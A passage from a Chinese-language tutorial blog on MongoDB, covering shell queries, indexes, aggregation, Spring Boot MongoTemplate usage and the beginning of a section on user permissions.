class="line">db.users.find(&#123;<span class="string">"age"</span>:3,<span class="string">"age"</span>:27&#125;); <span class="comment"># 同一字段多次出现查询条件时，只有最后的查询条件才生效，即后面会覆盖前面的查询条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># OR</span></span><br><span class="line"><span class="comment"># MongoDB OR 条件语句使用了关键字 $or,语法格式如下：</span></span><br><span class="line">db.集合名称.find(&#123;<span class="variable">$or</span>: [&#123;key1: value1&#125;, &#123;key2:value2&#125;]&#125;).pretty()</span><br><span class="line">db.users.find(&#123;<span class="variable">$or</span>:[&#123;_id:3&#125;,&#123;age:15&#125;]&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># AND 和 OR 联合</span></span><br><span class="line">db.users.find(&#123;age:&#123;<span class="variable">$gt</span>:15&#125;,<span class="variable">$or</span>:[&#123;_id:3&#125;,&#123;age:15&#125;]&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组中查询</span></span><br><span class="line">db.集合名称.insert(&#123; <span class="string">"_id"</span> : 11, <span class="string">"age"</span> : 29, <span class="string">"likes"</span> : [ <span class="string">"看电视"</span>, <span class="string">"读书xx"</span>, <span class="string">"美女"</span> ], <span class="string">"name"</span> : <span class="string">"shawn_xx_11"</span> &#125;)</span><br><span class="line"><span class="comment"># 执行数组查询</span></span><br><span class="line">db.users.find(&#123;likes:<span class="string">"看电视"</span>&#125;)</span><br><span class="line"><span class="comment"># $size 按照数组长度查询</span></span><br><span class="line">db.users.find(&#123;likes:&#123;<span class="variable">$size</span>:3&#125;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模糊查询</span></span><br><span class="line"><span class="comment"># 注意:在 mongoDB 中使用正则表达式可以是实现近似模糊查询功能</span></span><br><span class="line">db.users.find(&#123;likes:/shawn/&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序，1 升序  -1 降序</span></span><br><span class="line">db.集合名称.find().sort(&#123;name:1,age:1&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分页</span></span><br><span class="line">db.集合名称.find().sort(&#123;条件&#125;).skip(start).<span class="built_in">limit</span>(rows);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 总条数</span></span><br><span class="line">db.集合名称.count()</span><br><span class="line">db.集合名称.find(&#123;<span class="string">"name"</span>:<span class="string">"shawn"</span>&#125;).count();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去重</span></span><br><span class="line">db.集合名称.distinct(<span class="string">'字段'</span>)</span><br><span class="line">db.users.distinct(<span class="string">"age"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定返回字段</span></span><br><span class="line"><span class="comment"># 参数2: 1 返回  0 不返回  </span></span><br><span class="line">db.集合名称.find(&#123;条件&#125;,&#123;name:1,age:1&#125;) </span><br><span class="line"><span class="comment"># db.users.find(&#123;&#125;,&#123;"name":1&#125;)；查询所有，返回指定字段</span></span><br><span class="line"><span class="comment"># db.users.find(&#123;age:&#123;$lt:17&#125;&#125;,&#123;name:1&#125;)；按照指定条件查询，返回指定字段</span></span><br><span class="line"><span class="comment"># db.users.find(&#123;age:&#123;$lt:17&#125;&#125;,&#123;_id:0,name:1&#125;)；按照指定条件查询，返回指定字段，不返回id，注意id是唯一索引</span></span><br></pre></td></tr></table></figure><h3 id="2-4-type">2.4 $type</h3><p>$type操作符是基于BSON类型来检索集合中匹配的数据类型，并返回结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果想获取 "col" 集合中 title 为 String 的数据，你可以使用以下命令</span></span><br><span class="line">db.col.find(&#123;<span class="string">"title"</span> : &#123;<span class="variable">$type</span> : 2&#125;&#125;).pretty();</span><br><span class="line">db.col.find(&#123;<span class="string">"title"</span> : &#123;<span class="variable">$type</span> : <span class="string">'string'</span>&#125;&#125;).pretty();</span><br><span class="line"><span class="comment"># 如果想获取 "col" 集合中 tags 为 Array 的数据，你可以使用以下命令：</span></span><br><span class="line">db.col.find(&#123;<span class="string">"tags"</span>:&#123;<span class="variable">$type</span> : 4&#125;&#125;).pretty();</span><br><span class="line">db.col.find(&#123;<span class="string">"tags"</span> : &#123;<span class="variable">$type</span> : <span class="string">'array'</span>&#125;&#125;).pretty();</span><br></pre></td></tr></table></figure><h2 id="3、索引-index">3、索引&lt;index&gt;</h2><h3 id="3-1-原理">3.1 原理</h3><p>索引通常能够极大的提高查询的效率，如果没有索引，MongoDB在读取数据时必须扫描集合中的每个文件并选取那些符合查询条件的记录。这种扫描全集合的查询效率是非常低的，特别在处理大量的数据时，查询可以要花费几十秒甚至几分钟，这对网站的性能是非常致命的。索引是特殊的数据结构，索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。 <strong>默认_id已经创建了索引</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202312131426148.png" alt></p><h3 id="3-2-索引操作">3.2 索引操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 索引创建</span></span><br><span class="line"><span class="comment"># 说明: 语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，如果你想按降序来创建索引指定为 -1 即可</span></span><br><span class="line">db.集合名称.createIndex(keys, options)</span><br><span class="line">db.集合名称.createIndex(&#123;<span class="string">"title"</span>:1,<span class="string">"description"</span>:-1&#125;)</span><br><span class="line"><span class="comment"># 查看集合索引</span></span><br><span class="line">db.集合名称.getIndexes()</span><br><span class="line"><span class="comment"># 普通索引,key 为要创建索引的字段,1 为指定升序创建索引,降序可以指定为 -1</span></span><br><span class="line">db.集合名.ensureIndex(&#123;key:1&#125;);</span><br><span class="line"><span class="comment"># 唯一索引</span></span><br><span class="line">db.集合名.ensureIndex(&#123;key:1&#125;,&#123;unique:<span class="literal">true</span>&#125;);</span><br><span class="line"><span class="comment"># 查看集合索引大小</span></span><br><span class="line">db.集合名称.totalIndexSize()</span><br><span class="line"><span class="comment"># 删除集合所有索引（不包含_id索引）</span></span><br><span class="line">db.集合名称.dropIndexes() </span><br><span class="line"><span class="comment"># 删除集合指定索引</span></span><br><span class="line">db.集合名称.dropIndex(<span class="string">"索引名称"</span>)</span><br><span class="line"><span class="comment"># 查看 explain 执行计划---查看函数执行信息 </span></span><br><span class="line">db.集合名.find(&#123;age:6&#125;).explain();</span><br></pre></td></tr></table></figure><p>createIndex() 接收可选参数，可选参数列表如下：</p><table><thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>background</td><td>Boolean</td><td>建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 “background” 可选参数。 “background” 默认值为<strong>false</strong></td></tr><tr><td>unique</td><td>Boolean</td><td>建立的索引是否唯一。指定为true创建唯一索引。默认值为false.</td></tr><tr><td>name</td><td>string</td><td>索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。</td></tr><tr><td>sparse</td><td>Boolean</td><td>对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 false.</td></tr><tr><td>expireAfterSeconds</td><td>integer</td><td>指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。</td></tr><tr><td>v</td><td>index version</td><td>索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。</td></tr><tr><td>weights</td><td>document</td><td>索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重。</td></tr><tr><td>default_language</td><td>string</td><td>对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语</td></tr><tr><td>language_override</td><td>string</td><td>对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language.</td></tr></tbody></table><h3 id="3-3-复合索引">3.3 复合索引</h3><p>一个索引的值是由多个 key 进行维护的索引的称之为复合索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.集合名称.createIndex(&#123;<span class="string">"title"</span>:1,<span class="string">"description"</span>:-1&#125;)</span><br><span class="line"><span class="comment"># 注意: mongoDB 中复合索引和传统关系型数据库一致都是左前缀匹配原则</span></span><br></pre></td></tr></table></figure><h2 id="4、聚合-aggregate">4、聚合&lt;aggregate&gt;</h2><p>MongoDB 中聚合(aggregate)主要用于处理数据(诸如统计平均值，求和等)，并返回计算后的数据结果。有点类似 <strong>SQL</strong> 语句中的 <strong>count(*)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试用例</span></span><br><span class="line">db.test.insertMany([</span><br><span class="line">     &#123;</span><br><span class="line">        title: <span class="string">'MongoDB Overview'</span>, </span><br><span class="line">        description: <span class="string">'MongoDB is no sql database'</span>,</span><br><span class="line">        by_user: <span class="string">'runoob.com'</span>,</span><br><span class="line">        url: <span class="string">'http://www.runoob.com'</span>,</span><br><span class="line">        tags: [<span class="string">'mongodb'</span>, <span class="string">'database'</span>, <span class="string">'NoSQL'</span>],</span><br><span class="line">        likes: 100</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">        title: <span class="string">'NoSQL Overview'</span>, </span><br><span class="line">        description: <span class="string">'No sql database is very fast'</span>,</span><br><span class="line">        by_user: <span class="string">'runoob.com'</span>,</span><br><span class="line">        url: <span class="string">'http://www.runoob.com'</span>,</span><br><span class="line">        tags: [<span class="string">'mongodb'</span>, <span class="string">'database'</span>, <span class="string">'NoSQL'</span>],</span><br><span class="line">        likes: 10</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">        title: <span class="string">'Neo4j Overview'</span>, </span><br><span class="line">        description: <span class="string">'Neo4j is no sql database'</span>,</span><br><span class="line">        by_user: <span class="string">'Neo4j'</span>,</span><br><span class="line">        url: <span class="string">'http://www.neo4j.com'</span>,</span><br><span class="line">        tags: [<span class="string">'neo4j'</span>, <span class="string">'database'</span>, <span class="string">'NoSQL'</span>],</span><br><span class="line">        likes: 750</span><br><span class="line">     &#125;</span><br><span class="line"> ]);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在我们通过以上集合计算每个作者所写的文章数，使用aggregate()计算结果如下</span></span><br><span class="line"><span class="comment"># 注意：此处的_id是分组表示，不是文档的 _id</span></span><br><span class="line">db.test.aggregate([&#123;<span class="variable">$group</span> : &#123;</span><br><span class="line">                      _id : <span class="string">"<span class="variable">$by_user</span>"</span>, </span><br><span class="line">                      num_tutorial : &#123;<span class="variable">$sum</span> : 1&#125;</span><br><span class="line"> &#125;&#125;])</span><br></pre></td></tr></table></figure><p>常见聚合表达式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $sum,计算总和</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, num_tutorial : &#123;<span class="variable">$sum</span> : <span class="string">"<span class="variable">$likes</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $avg,计算平均值</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, num_tutorial : &#123;<span class="variable">$avg</span> : <span class="string">"<span class="variable">$likes</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $min,获取集合中所有文档对应值得最小值</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, num_tutorial : &#123;<span class="variable">$min</span> : <span class="string">"<span class="variable">$likes</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $max,获取集合中所有文档对应值得最大值</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, num_tutorial : &#123;<span class="variable">$max</span> : <span class="string">"<span class="variable">$likes</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $push,将值加入一个数组中，不会判断是否有重复的值</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, url : &#123;<span class="variable">$push</span>: <span class="string">"<span class="variable">$url</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $addToSet,将值加入一个数组中，会判断是否有重复的值，若相同的值在数组中已经存在了，则不加入</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, url : &#123;<span class="variable">$addToSet</span> : <span class="string">"<span class="variable">$url</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $first,根据资源文档的排序获取第一个文档数据</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, first_url : &#123;<span class="variable">$first</span> : <span class="string">"<span class="variable">$url</span>"</span>&#125;&#125;&#125;])</span><br><span class="line"><span class="comment"># $last,根据资源文档的排序获取最后一个文档数据</span></span><br><span class="line">db.mycol.aggregate([&#123;<span class="variable">$group</span> : &#123;_id : <span class="string">"<span class="variable">$by_user</span>"</span>, last_url : &#123;<span class="variable">$last</span> : <span class="string">"<span class="variable">$url</span>"</span>&#125;&#125;&#125;])</span><br></pre></td></tr></table></figure><h1>三、应用整合</h1><h2 id="1、SpringBoot整合">1、SpringBoot整合</h2><h3 id="1-1-环境配置">1.1 环境配置</h3><p>创建springboot工程羡慕，引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># mongodb 没有开启任何安全协议</span><br><span class="line"># mongodb(协议):&#x2F;&#x2F;121.5.167.13(主机):27017(端口)&#x2F;baizhi(库名)</span><br><span class="line">spring.data.mongodb.uri&#x3D;mongodb:&#x2F;&#x2F;192.168.31.167:27017&#x2F;baizhi</span><br><span class="line">​</span><br><span class="line"># mongodb 存在密码</span><br><span class="line">#spring.data.mongodb.host&#x3D;shawn</span><br><span class="line">#spring.data.mongodb.port&#x3D;27017</span><br><span class="line">#spring.data.mongodb.database&#x3D;baizhi</span><br><span class="line">#spring.data.mongodb.username&#x3D;root</span><br><span class="line">#spring.data.mongodb.password&#x3D;root</span><br></pre></td></tr></table></figure><h3 id="1-2-集合操作">1.2 集合操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建集合</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCreateCollection</span><span class="params">()</span></span>&#123;</span><br><span class="line">  mongoTemplate.createCollection(<span class="string">"users"</span>);<span class="comment">//参数: 创建集合名称</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 创建的集合已经存在时，再次创建会报错，因此创建前需要判断集合时候已经存在</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCreateCollection</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="comment">// 判断集合是否存在</span></span><br><span class="line">   <span class="keyword">boolean</span> isExist = mongoTemplate.collectionExists(<span class="string">"products"</span>);</span><br><span class="line">   <span class="comment">// 不存在时创建集合</span></span><br><span class="line">   <span class="keyword">if</span> (!isExist) &#123;</span><br><span class="line">       mongoTemplate.createCollection(<span class="string">"products"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除集合</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDropCollection</span><span class="params">()</span></span>&#123;</span><br><span class="line">   mongoTemplate.dropCollection(<span class="string">"products"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-相关注解">1.3 相关注解</h3><p>Java–&gt;对象–&gt;JSON–&gt;MongoDB</p><p><strong>@Document 对应 类</strong></p><ul><li>修饰范围: 用在类上</li><li>作用: 用来映射这个类的一个对象为 mongo 中一条文档数据</li><li>属性：(value 、collection )用来指定操作的集合名称</li></ul><p><strong>@Id 对应 要指定为_id的变量名</strong></p><ul><li>修饰范围: 用在成员变量、方法上，只能出现一次</li><li>作用： 用来将成员变量的值映射为文档的_id 的值</li></ul><p><strong>@Field 对应 剩余变量名</strong>（变量名都按照类中属性名定义时，可以不指定，即同名时可不指定）</p><ul><li>修饰范围: 用在成员变量、方法上</li><li>作用: 用来将成员变量以及值映射为文档中一个key、value对</li><li>属性: ( name,value)用来指定在文档中 key 的名称,默认为成员变量名</li></ul><p><strong>@Transient 不参与文档转换</strong></p><ul><li>修饰范围: 用在成员变量、方法上</li><li>作用 : 用来指定改成员变量，不参与文档的序列化</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mongoTemplate.insert(<span class="keyword">new</span> User(<span class="number">4</span>, <span class="string">"小wangb"</span>, <span class="number">22</span>, <span class="keyword">new</span> Date()), <span class="string">"db1"</span>);</span><br><span class="line">mongoTemplate.save(<span class="keyword">new</span> User(<span class="number">1</span>,<span class="string">"小米"</span>,<span class="number">22</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">mongoTemplate.insert(Arrays.asList(<span class="keyword">new</span> User(<span class="number">2</span>, <span class="string">"小号"</span>, <span class="number">11</span>, <span class="keyword">new</span> Date()),<span class="keyword">new</span> User(<span class="number">3</span>, <span class="string">"chiwan"</span>, <span class="number">99</span>, <span class="keyword">new</span> Date())), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insert 可以批量插入数据，重复id会报错</span></span><br><span class="line"><span class="comment">// save不可以批量插入数据，重复id不会报错</span></span><br></pre></td></tr></table></figure><h3 id="1-4-文档查询">1.4 文档查询</h3><p><img src="http://qnypic.shawncoding.top/blog/202312131426149.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据id查询</span></span><br><span class="line">mongoTemplate.findById(<span class="number">1</span>, User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//查询所有</span></span><br><span class="line">mongoTemplate.findAll(User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//等值查询</span></span><br><span class="line">mongoTemplate.find(Query.query(Criteria.where(<span class="string">"name"</span>).is(<span class="string">"小红"</span>)), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//&lt;,&gt;,&gt;=,&lt;=</span></span><br><span class="line">mongoTemplate.find(Query.query(Criteria.where(<span class="string">"age"</span>).lt(<span class="number">33</span>)), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//and查询</span></span><br><span class="line">mongoTemplate.find(Query.query(Criteria.where(<span class="string">"name"</span>).is(<span class="string">"小号"</span>).and(<span class="string">"age"</span>).is(<span class="number">11</span>)), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//or查询</span></span><br><span class="line">Criteria criteria = <span class="keyword">new</span> Criteria();</span><br><span class="line">criteria.orOperator(Criteria.where(<span class="string">"name"</span>).is(<span class="string">"小号"</span>), Criteria.where(<span class="string">"name"</span>).is(<span class="string">"小红"</span>));</span><br><span class="line">mongoTemplate.find(Query.query(criteria), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//and or 查询</span></span><br><span class="line">mongoTemplate.find(Query.query(Criteria.where(<span class="string">"age"</span>).is(<span class="number">22</span>).orOperator(Criteria.where(<span class="string">"name"</span>).is(<span class="string">"小红"</span>), criteria.where(<span class="string">"name"</span>).is(<span class="string">"小wangb"</span>))), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line">mongoTemplate.find(<span class="keyword">new</span> Query().with(Sort.by(Sort.Order.desc(<span class="string">"age"</span>))), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//分页</span></span><br><span class="line">mongoTemplate.find(<span class="keyword">new</span> Query().with(Sort.by(Sort.Order.desc(<span class="string">"age"</span>))).skip(<span class="number">3</span>).limit(<span class="number">2</span>), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//总条数</span></span><br><span class="line">mongoTemplate.count(<span class="keyword">new</span> Query(), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//去重</span></span><br><span class="line">mongoTemplate.findDistinct(<span class="keyword">new</span> Query(), <span class="string">"age"</span>, User<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line"><span class="comment">//传统采用Json格式查询</span></span><br><span class="line">mongoTemplate.find(<span class="keyword">new</span> BasicQuery(<span class="string">"&#123;$or:[&#123;age:22&#125;,&#123;age:99&#125;]&#125;"</span>, <span class="string">"&#123;name:0&#125;"</span>), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="1-5-文档更新-删除">1.5 文档更新&amp;删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ====== 更新 ====</span></span><br><span class="line"><span class="comment">//更新第一条</span></span><br><span class="line">Query query = <span class="keyword">new</span> Query(Criteria.where(<span class="string">"age"</span>).is(<span class="number">44</span>));</span><br><span class="line">mongoTemplate.updateFirst(query, <span class="keyword">new</span> Update().set(<span class="string">"age"</span>, <span class="number">33</span>).set(<span class="string">"name"</span>, <span class="string">"小王八"</span>), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//更新批量</span></span><br><span class="line">mongoTemplate.updateMulti(query, <span class="keyword">new</span> Update().set(<span class="string">"age"</span>, <span class="number">11</span>), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//更新插入</span></span><br><span class="line">UpdateResult age = mongoTemplate.upsert(query, <span class="keyword">new</span> Update().set(<span class="string">"age"</span>, <span class="number">44</span>), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(age.getModifiedCount());<span class="comment">//修改条数</span></span><br><span class="line">System.out.println(age.getMatchedCount());<span class="comment">//匹配条数</span></span><br><span class="line">System.out.println(age.getUpsertedId());<span class="comment">//插入id</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ====== 删除 ====</span></span><br><span class="line"><span class="comment">//条件删除</span></span><br><span class="line">mongoTemplate.remove(<span class="keyword">new</span> Query(Criteria.where(<span class="string">"age"</span>).is(<span class="number">44</span>)), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//删除所有</span></span><br><span class="line">mongoTemplate.remove(<span class="keyword">new</span> Query(), User<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h1>四、权限配置与可视化</h1><h2 id="1、概述-v2">1、概述</h2><p>刚安装完毕的mongodb默认不使用权限认证方式启动，与MySQL不同，mongodb在安装的时候并没有设置权限，然而公网运行系统需要设置权限以保证数据安全。MongoDB是没有默认管理员账号，所以要先添加管理员账号，并且mongodb服务器需要在运行的时候开启验证模式</p><ul><li>用户只能在用户所在数据库登录(创建用户的数据库)，包括管理员账号。</li><li>管理员可以管理所有数据库，但是不能直接管理其他数据库，要先认证后才可以。</li></ul><h2 id="2、权限管理">2、权限管理</h2><h3 id="2-1-创建账户">2.1 创建账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入mongodb的shell</span></span><br><span class="line">mongo</span><br><span class="line"><span class="comment"># 使用admin数据库(超级管理员账号必须创建在该数据库上)</span></span><br><span class="line">use admin</span><br><span class="line"><span class="comment"># 创建一个不受访问限制的超级用户</span></span><br><span class="line">db.createUser(&#123;<span class="string">"user"</span>:<span class="string">"user"</span>,<span 